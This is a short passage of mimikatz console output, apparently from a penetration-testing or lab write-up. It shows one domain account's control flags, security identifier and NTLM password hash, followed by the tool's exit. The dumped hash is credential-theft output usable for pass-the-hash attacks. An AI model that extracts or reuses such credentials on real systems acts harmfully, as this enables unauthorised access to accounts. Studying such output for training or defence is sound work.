User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-323145914-28650650-2368316563-1106
Object Relative ID   : 1106

Credentials:
  Hash NTLM: 6b8caa0cd4f8cb8ddf2b5677a24cc510

mimikatz(commandline) # exit
Bye!
```